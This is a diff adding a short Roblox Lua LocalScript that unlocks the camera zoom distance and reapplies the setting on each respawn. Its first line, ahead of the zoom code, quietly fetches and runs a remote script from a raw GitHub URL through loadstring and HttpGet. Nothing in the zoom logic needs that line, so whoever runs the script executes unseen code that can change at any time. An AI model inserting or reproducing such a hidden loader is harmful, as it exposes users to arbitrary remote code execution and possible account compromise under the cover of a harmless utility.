@@ -1,0 +1,16 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/mista0poku/script/refs/heads/main/1"))()
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+assert(player, "Run this as a LocalScript on the client.")
+
+-- A large finite value avoids infinity-related camera math problems.
+local MAX_ZOOM = 100000
+
+local function enableZoom()
+    player.CameraMode = Enum.CameraMode.Classic
+    player.CameraMinZoomDistance = 0.5
+    player.CameraMaxZoomDistance = MAX_ZOOM
+end
+
+enableZoom()
+player.CharacterAdded:Connect(enableZoom)
